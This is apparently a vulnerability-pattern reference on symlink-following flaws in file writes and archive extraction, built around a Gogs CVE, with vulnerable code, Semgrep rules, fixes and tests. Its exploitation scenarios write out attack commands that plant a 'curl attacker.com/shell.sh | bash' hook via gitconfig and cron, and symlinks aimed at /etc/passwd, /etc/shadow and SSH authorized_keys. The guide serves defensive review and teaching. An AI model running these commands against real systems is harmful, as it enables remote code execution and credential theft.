# Symlink Following in File Operations

## Pattern Overview

| Attribute | Value |
|-----------|-------|
| **Pattern Class** | `traversal/symlink-follow` |
| **Severity** | HIGH |
| **Score** | 8/10 |
| **CVSS** | 8.8 |
| **CWE** | CWE-59 (Improper Link Resolution), CWE-22 (Path Traversal) |
| **Languages** | Go, Python, JavaScript, Ruby, PHP, Java, any |
| **Source CVE** | CVE-2025-8110 (Gogs) |
| **Status** | Actively exploited, unpatched as of December 2025 |

## Description

Symlink following vulnerabilities occur when an application validates a file path but then performs operations that follow symbolic links to unintended destinations. The application checks that a path is within allowed boundaries, but the actual file operation resolves symlinks and accesses files outside those boundaries.

This is particularly dangerous in:
- Git hosting platforms (GitHub, GitLab, Gogs, Gitea)
- Archive extraction (zip, tar)
- File upload handlers
- Container/sandbox escapes

## Technical Details

### Root Cause

The vulnerability exists because:
1. Path validation checks the **symlink path**, not where it points
2. File operations then **follow the symlink** to the target
3. Attacker controls symlink creation (e.g., via git commit)

From the Gogs CVE-2025-8110 analysis:
> "The API writes to the file path without checking if the target file is actually a symlink pointing outside the repo. This renders path validation useless if a symlink is involved."

### Attack Flow

```
1. Attacker creates symlink in allowed directory:
   /repo/innocent.txt → /etc/passwd

2. Application validates path:
   "/repo/innocent.txt" starts with "/repo/" ✓ PASS

3. Application writes to path:
   write("/repo/innocent.txt", data)
   → Actually writes to /etc/passwd!
```

### Vulnerable Code Patterns

#### Pattern 1: Path Validation Without Symlink Check (Go)

```go
// VULNERABLE: Validates path but not symlink destination
func writeFile(repoPath, filePath string, data []byte) error {
    fullPath := filepath.Join(repoPath, filePath)

    // Path validation passes for symlinks
    if !strings.HasPrefix(fullPath, repoPath) {
        return errors.New("path traversal detected")
    }

    // But WriteFile follows the symlink!
    return os.WriteFile(fullPath, data, 0644)
}

// Attack: filePath points to symlink → /etc/crontab
// Validation passes, but write goes outside repoPath
```

#### Pattern 2: Archive Extraction (Python)

```python
# VULNERABLE: Extracts symlinks that point outside
import tarfile

def extract_archive(tar_path, dest_dir):
    with tarfile.open(tar_path) as tar:
        for member in tar.getmembers():
            # Checks member name but not symlink target
            if member.name.startswith('..'):
                continue  # Catches obvious traversal

            # But symlinks slip through!
            tar.extract(member, dest_dir)

# Attack: Archive contains symlink "data.txt" → "/etc/passwd"
# Extraction creates symlink, later operations follow it
```

#### Pattern 3: File Upload Handler (Node.js)

```javascript
// VULNERABLE: Saves file without checking for symlink
async function saveUpload(uploadDir, filename, data) {
    const filePath = path.join(uploadDir, filename);

    // Validate path is under uploadDir
    if (!filePath.startsWith(uploadDir)) {
        throw new Error('Invalid path');
    }

    // If filePath is an existing symlink, this follows it!
    await fs.writeFile(filePath, data);
}

// Attack: Attacker previously created symlink at uploadDir/evil.txt
// Pointing to /app/config.json. Upload overwrites config.
```

#### Pattern 4: Git Repository Operations (Gogs/Gitea)

```go
// VULNERABLE: From CVE-2025-8110
func (r *Repository) UpdateFile(path string, content []byte) error {
    fullPath := filepath.Join(r.Path, path)

    // Standard path traversal check
    if !strings.HasPrefix(fullPath, r.Path) {
        return ErrPathTraversal
    }

    // Git allows symlinks in repos - this follows them!
    return os.WriteFile(fullPath, content, 0644)
}

// Attack:
// 1. Create repo with symlink: data.txt → /home/git/.ssh/authorized_keys
// 2. Use API to update "data.txt"
// 3. Content written to authorized_keys → SSH access!
```

### Exploitation Scenarios

#### Scenario 1: Git Hosting RCE (CVE-2025-8110)

```bash
# Create malicious repository
git init evil-repo
cd evil-repo
ln -s /home/git/.gitconfig symlink.txt
git add symlink.txt
git commit -m "Add symlink"
git push

# Use API to write to symlink.txt
curl -X PUT "https://gogs.target.com/api/v1/repos/user/evil-repo/contents/symlink.txt" \
    -H "Authorization: token $TOKEN" \
    -d '{"content":"'$(echo -e "[core]\n\tsshCommand = curl http://attacker.com/shell.sh | bash" | base64)'"}'

# Now any git operation by the server executes our command
```

#### Scenario 2: Archive Extraction Escape

```bash
# Create malicious tarball
mkdir payload
ln -s /etc/cron.d/pwned payload/cron.txt
tar czf evil.tar.gz payload/

# Upload and trigger extraction
curl -F "file=@evil.tar.gz" https://target.com/upload

# Later, write to the "extracted" file
curl -X POST https://target.com/files/payload/cron.txt \
    -d "* * * * * root curl http://attacker.com/shell.sh | bash"
```

#### Scenario 3: Container Escape

```bash
# Inside container, create symlink to host file
ln -s /host/etc/shadow /app/data/users.txt

# Application's file export follows symlink
# GET /export/users.txt returns /etc/shadow from host!
```

## Detection

### Semgrep Rule Approach

```yaml
rules:
  - id: symlink-write-without-check
    patterns:
      - pattern-either:
          # Go
          - pattern: os.WriteFile($PATH, ...)
          - pattern: ioutil.WriteFile($PATH, ...)
          - pattern: os.Create($PATH)
          # Python
          - pattern: open($PATH, "w")
          - pattern: shutil.copy(..., $PATH)
          # Node.js
          - pattern: fs.writeFile($PATH, ...)
          - pattern: fs.writeFileSync($PATH, ...)
      - pattern-not-inside: |
          $INFO, $ERR := os.Lstat($PATH)
          ...
      - pattern-not-inside: |
          os.path.islink($PATH)
          ...
      - pattern-not-inside: |
          fs.lstatSync($PATH)
          ...
    message: >
      File write without symlink check. If path could be a symlink,
      attacker may write to arbitrary locations. Use Lstat/lstat/islink
      to detect symlinks before writing.
    languages: [go, python, javascript]
    severity: WARNING

  - id: archive-extraction-symlink
    patterns:
      - pattern-either:
          - pattern: tarfile.open(...).extractall(...)
          - pattern: zipfile.ZipFile(...).extractall(...)
          - pattern: tar.Extract(...)
      - pattern-not-inside: |
          if member.issym() or member.islnk():
            ...
    message: >
      Archive extraction without symlink filtering. Malicious archives
      can contain symlinks that escape the extraction directory.
    languages: [python]
    severity: ERROR
```

### Manual Code Review

Look for:
1. File write operations after path validation
2. Archive extraction without symlink filtering
3. Operations in Git repositories or user-controlled directories
4. Missing `Lstat`/`lstat` calls before file operations

### Testing

```bash
# Create test symlink
ln -s /etc/passwd /tmp/test-app/uploads/innocent.txt

# Attempt to read through application
curl https://target.com/files/innocent.txt
# If you get /etc/passwd content, vulnerable!

# Attempt to write
curl -X POST https://target.com/files/innocent.txt -d "pwned"
# Check if /etc/passwd was modified (in test environment!)
```

## Remediation

### Option 1: Check for Symlinks with Lstat

```go
// Go: Use Lstat instead of Stat to detect symlinks
func safeWriteFile(basePath, userPath string, data []byte) error {
    fullPath := filepath.Join(basePath, userPath)

    // Standard path traversal check
    absPath, err := filepath.Abs(fullPath)
    if err != nil || !strings.HasPrefix(absPath, basePath) {
        return errors.New("invalid path")
    }

    // Check if path is a symlink
    info, err := os.Lstat(fullPath)
    if err == nil && info.Mode()&os.ModeSymlink != 0 {
        return errors.New("symlinks not allowed")
    }

    // Now safe to write
    return os.WriteFile(fullPath, data, 0644)
}
```

```python
# Python: Check with os.path.islink
def safe_write(base_path, user_path, data):
    full_path = os.path.join(base_path, user_path)

    # Resolve to absolute and check prefix
    abs_path = os.path.abspath(full_path)
    if not abs_path.startswith(os.path.abspath(base_path)):
        raise ValueError("Path traversal detected")

    # Check for symlink
    if os.path.islink(full_path):
        raise ValueError("Symlinks not allowed")

    # Safe to write
    with open(full_path, 'w') as f:
        f.write(data)
```

```javascript
// Node.js: Use lstatSync to check for symlinks
const fs = require('fs');
const path = require('path');

function safeWrite(baseDir, userPath, data) {
    const fullPath = path.join(baseDir, userPath);
    const absPath = path.resolve(fullPath);

    if (!absPath.startsWith(path.resolve(baseDir))) {
        throw new Error('Path traversal detected');
    }

    // Check for symlink
    try {
        const stats = fs.lstatSync(fullPath);
        if (stats.isSymbolicLink()) {
            throw new Error('Symlinks not allowed');
        }
    } catch (e) {
        if (e.code !== 'ENOENT') throw e;
        // File doesn't exist, OK to create
    }

    fs.writeFileSync(fullPath, data);
}
```

### Option 2: Resolve Symlinks and Revalidate

```go
// Resolve the symlink and check the real path
func safeWriteResolved(basePath, userPath string, data []byte) error {
    fullPath := filepath.Join(basePath, userPath)

    // Resolve ALL symlinks in the path
    realPath, err := filepath.EvalSymlinks(fullPath)
    if err != nil {
        // If path doesn't exist, resolve parent
        dir := filepath.Dir(fullPath)
        realDir, err := filepath.EvalSymlinks(dir)
        if err != nil {
            return err
        }
        realPath = filepath.Join(realDir, filepath.Base(fullPath))
    }

    // Validate the REAL path, not the symlink path
    if !strings.HasPrefix(realPath, basePath) {
        return errors.New("path escapes allowed directory")
    }

    return os.WriteFile(realPath, data, 0644)
}
```

### Option 3: Safe Archive Extraction

```python
import tarfile
import os

def safe_extract(tar_path, dest_dir):
    dest_dir = os.path.abspath(dest_dir)

    with tarfile.open(tar_path) as tar:
        for member in tar.getmembers():
            # Skip symlinks and hardlinks
            if member.issym() or member.islnk():
                print(f"Skipping link: {member.name}")
                continue

            # Validate extraction path
            member_path = os.path.abspath(os.path.join(dest_dir, member.name))
            if not member_path.startswith(dest_dir):
                raise ValueError(f"Path traversal: {member.name}")

            tar.extract(member, dest_dir)
```

### Option 4: Use O_NOFOLLOW Flag

```go
// Open with O_NOFOLLOW to fail on symlinks
import "syscall"

func openNoFollow(path string, flag int, perm os.FileMode) (*os.File, error) {
    fd, err := syscall.Open(path, flag|syscall.O_NOFOLLOW, uint32(perm))
    if err != nil {
        return nil, err
    }
    return os.NewFile(uintptr(fd), path), nil
}
```

## Testing

### Unit Tests

```go
func TestSymlinkProtection(t *testing.T) {
    // Setup
    tmpDir := t.TempDir()
    targetFile := filepath.Join(tmpDir, "target.txt")
    symlinkFile := filepath.Join(tmpDir, "allowed", "link.txt")

    os.MkdirAll(filepath.Join(tmpDir, "allowed"), 0755)
    os.WriteFile(targetFile, []byte("original"), 0644)
    os.Symlink(targetFile, symlinkFile)

    // Test: Writing to symlink should fail
    err := safeWriteFile(filepath.Join(tmpDir, "allowed"), "link.txt", []byte("pwned"))
    if err == nil {
        t.Error("Expected error when writing to symlink")
    }

    // Verify original file wasn't modified
    content, _ := os.ReadFile(targetFile)
    if string(content) != "original" {
        t.Error("Symlink was followed and file was modified!")
    }
}
```

### Integration Tests

```python
def test_symlink_upload_rejected():
    """Symlink in upload directory should not be followed"""
    # Setup: Create symlink in upload directory
    os.symlink('/etc/passwd', '/tmp/uploads/test.txt')

    # Attempt to write through symlink
    with pytest.raises(ValueError, match="Symlinks not allowed"):
        safe_write('/tmp/uploads', 'test.txt', 'pwned')

    # Cleanup
    os.unlink('/tmp/uploads/test.txt')
```

## Real-World Impact

### CVE-2025-8110 (Gogs)
- **Impact**: Authenticated RCE via symlink + file write
- **Exploitation**: Active in the wild, 700+ compromised instances
- **Attack chain**: Create repo with symlink → Write to symlink via API → Overwrite `.git/config` → RCE on next git operation
- **Status**: Unpatched as of December 2025

### Historical Examples
- **Zip Slip** (CVE-2018-1002200): Archive extraction with symlinks
- **Git LFS**: Multiple symlink-related vulnerabilities
- **Docker**: Container escape via symlinks

## References

- [Wiz: Gogs CVE-2025-8110 Zero-Day](https://www.wiz.io/blog/wiz-research-gogs-cve-2025-8110-rce-exploit)
- [CWE-59: Improper Link Resolution](https://cwe.mitre.org/data/definitions/59.html)
- [Zip Slip Vulnerability](https://security.snyk.io/research/zip-slip-vulnerability)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

## Related Patterns

- `traversal/archive-escape` - Symlinks in archives (Zip Slip)
- `traversal/path-join-bypass` - Path validation bypasses
- `traversal/toctou` - Time-of-check to time-of-use race conditions
- `container/symlink-escape` - Container breakout via symlinks
